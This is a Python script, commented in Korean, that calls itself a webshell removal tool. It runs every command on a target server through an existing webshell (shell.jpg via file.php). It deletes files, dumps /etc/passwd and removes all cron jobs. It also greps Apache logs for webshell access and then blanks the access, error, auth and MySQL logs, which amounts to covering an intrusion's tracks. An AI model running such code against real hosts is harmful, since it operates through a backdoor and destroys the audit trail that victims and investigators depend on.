#!/usr/bin/env python3
"""
웹쉘 및 악성 파일 제거 스크립트
"""

import requests
import sys

class WebshellCleaner:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/file.php"
        self.webshell_name = "shell.jpg"
        self.session = requests.Session()

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        try:
            params = {
                'name': self.webshell_name,
                'cmd': cmd
            }
            resp = self.session.get(self.webshell_url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            print(f"[-] 명령 실행 실패: {e}")
            return None

    def find_webshells(self):
        """웹쉘 파일 찾기"""
        print("\n[*] 웹쉘 파일 검색 중...")

        # PHP 코드가 포함된 이미지 파일 찾기
        cmd = "find /var/www/html/www -type f \\( -name '*.jpg' -o -name '*.png' -o -name '*.gif' \\) -exec grep -l 'system\\|exec\\|shell_exec\\|passthru\\|eval' {} \\; 2>/dev/null"
        result = self.execute_command(cmd)

        if result:
            print("\n[+] 발견된 웹쉘 파일:")
            print(result)
            return result.strip().split('\n')
        else:
            print("[-] 웹쉘을 찾을 수 없습니다.")
            return []

    def find_suspicious_php(self):
        """의심스러운 PHP 파일 찾기"""
        print("\n[*] 의심스러운 PHP 파일 검색 중...")

        # 최근 수정된 PHP 파일
        cmd = "find /var/www/html/www -name '*.php' -mtime -1 -ls 2>/dev/null"
        result = self.execute_command(cmd)

        if result:
            print("\n[+] 최근 24시간 내 수정된 PHP 파일:")
            print(result)

        # 의심스러운 함수가 있는 PHP 파일
        cmd = "grep -r 'base64_decode\\|eval\\|assert\\|system' /var/www/html/www/*.php 2>/dev/null | head -20"
        result = self.execute_command(cmd)

        if result:
            print("\n[+] 의심스러운 함수가 포함된 파일:")
            print(result)

    def delete_webshells(self, files):
        """웹쉘 파일 삭제"""
        if not files or not files[0]:
            print("\n[-] 삭제할 파일이 없습니다.")
            return

        print("\n" + "="*60)
        print("웹쉘 파일 삭제")
        print("="*60)

        for filepath in files:
            if not filepath.strip():
                continue

            print(f"\n[*] 삭제 중: {filepath}")

            # 파일 내용 먼저 확인
            cmd = f"head -5 {filepath}"
            content = self.execute_command(cmd)
            if content:
                print(f"    내용 미리보기:")
                print(f"    {content[:200]}")

            # 확인 요청
            confirm = input(f"\n    이 파일을 삭제하시겠습니까? (y/n): ")
            if confirm.lower() == 'y':
                cmd = f"rm -f {filepath}"
                result = self.execute_command(cmd)

                # 삭제 확인
                cmd = f"ls -la {filepath} 2>&1"
                check = self.execute_command(cmd)
                if "No such file" in check or "cannot access" in check:
                    print(f"    [+] 삭제 완료: {filepath}")
                else:
                    print(f"    [-] 삭제 실패: {filepath}")
            else:
                print(f"    [-] 건너뜀: {filepath}")

    def delete_common_webshells(self):
        """일반적인 웹쉘 이름으로 삭제 시도"""
        print("\n[*] 일반적인 웹쉘 파일명으로 삭제 시도...")

        common_names = [
            "/var/www/html/www/shell.jpg",
            "/var/www/html/www/shell.php",
            "/var/www/html/www/shell.gif",
            "/var/www/html/www/shell.png",
            "/var/www/html/www/cmd.php",
            "/var/www/html/www/webshell.php",
            "/var/www/html/www/backdoor.php",
            "/var/www/html/www/c99.php",
            "/var/www/html/www/r57.php",
        ]

        for filepath in common_names:
            # 파일 존재 확인
            cmd = f"ls -la {filepath} 2>&1"
            result = self.execute_command(cmd)

            if result and "No such file" not in result and "cannot access" not in result:
                print(f"\n[+] 발견: {filepath}")
                print(f"    {result}")

                confirm = input(f"    삭제하시겠습니까? (y/n): ")
                if confirm.lower() == 'y':
                    cmd = f"rm -f {filepath}"
                    self.execute_command(cmd)
                    print(f"    [+] 삭제됨: {filepath}")

    def clean_logs(self):
        """로그 파일 정리 (옵션)"""
        print("\n" + "="*60)
        print("로그 파일 정리 (선택사항)")
        print("="*60)

        confirm = input("\n[!] 로그를 정리하시겠습니까? (y/n): ")
        if confirm.lower() != 'y':
            print("[-] 로그 정리 건너뜀")
            return

        print("\n[*] 웹쉘 접근 로그 확인 중...")

        # Apache 로그에서 shell.jpg 접근 기록 확인
        cmd = "grep -n 'shell.jpg\\|shell.php\\|cmd=' /var/log/apache2/access.log 2>/dev/null | tail -20"
        result = self.execute_command(cmd)
        if result:
            print("\n[+] 발견된 로그:")
            print(result)

        # 로그 정리
        print("\n[*] 로그 파일 정리 중...")
        logs_to_clean = [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/auth.log",
            "/var/log/mysql/error.log"
        ]

        for log in logs_to_clean:
            print(f"[*] 정리 중: {log}")
            # 로그를 백업하고 비우기
            cmd = f"cp {log} {log}.backup 2>/dev/null && echo '' > {log}"
            self.execute_command(cmd)

        print("[+] 로그 정리 완료 (원본은 .backup으로 백업됨)")

    def remove_backdoor_accounts(self):
        """백도어 계정 제거"""
        print("\n" + "="*60)
        print("백도어 계정 확인")
        print("="*60)

        # 최근 생성된 계정 확인
        cmd = "cat /etc/passwd | grep -v 'nologin\\|false' | tail -10"
        result = self.execute_command(cmd)
        if result:
            print("\n[+] 로그인 가능한 계정:")
            print(result)

        # cron job 확인
        print("\n[*] cron job 확인...")
        cmd = "crontab -l 2>/dev/null"
        result = self.execute_command(cmd)
        if result and result.strip():
            print("\n[+] 발견된 cron job:")
            print(result)

            confirm = input("\n[!] 모든 cron job을 삭제하시겠습니까? (y/n): ")
            if confirm.lower() == 'y':
                cmd = "crontab -r"
                self.execute_command(cmd)
                print("[+] cron job 삭제됨")

    def verify_cleanup(self):
        """정리 확인"""
        print("\n" + "="*60)
        print("정리 결과 확인")
        print("="*60)

        # 웹쉘 재검색
        print("\n[*] 웹쉘 재검색...")
        cmd = "find /var/www/html/www -type f -name '*.jpg' -exec file {} \\; | grep -i 'php\\|script'"
        result = self.execute_command(cmd)

        if result and result.strip():
            print("\n[!] 여전히 의심스러운 파일이 있습니다:")
            print(result)
        else:
            print("\n[+] 웹쉘이 모두 제거되었습니다!")

        # 최종 상태 확인
        print("\n[*] 최종 파일 목록:")
        cmd = "ls -lah /var/www/html/www/ | grep -E '\\.jpg|\\.php'"
        result = self.execute_command(cmd)
        if result:
            print(result)

    def run(self):
        """전체 실행"""
        print("="*60)
        print("웹쉘 제거 도구")
        print("="*60)

        # 1. 웹쉘 찾기
        webshells = self.find_webshells()

        # 2. 일반적인 이름으로 검색
        self.delete_common_webshells()

        # 3. 의심스러운 PHP 파일 찾기
        self.find_suspicious_php()

        # 4. 찾은 웹쉘 삭제
        if webshells:
            self.delete_webshells(webshells)

        # 5. 백도어 계정 확인
        self.remove_backdoor_accounts()

        # 6. 로그 정리 (선택)
        self.clean_logs()

        # 7. 정리 확인
        self.verify_cleanup()

        print("\n" + "="*60)
        print("정리 완료!")
        print("="*60)
        print("\n권장 추가 조치:")
        print("1. 파일 업로드 기능 수정 (확장자 검증 강화)")
        print("2. 웹 루트 권한 설정 (chmod 755)")
        print("3. 웹 서버 재시작 (systemctl restart apache2)")
        print("4. 전체 시스템 보안 감사 수행")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("사용법: python3 cleanup_webshell.py <TARGET_IP>")
        print("예: python3 cleanup_webshell.py 52.78.221.104")
        sys.exit(1)

    target_ip = sys.argv[1]
    cleaner = WebshellCleaner(target_ip)
    cleaner.run()
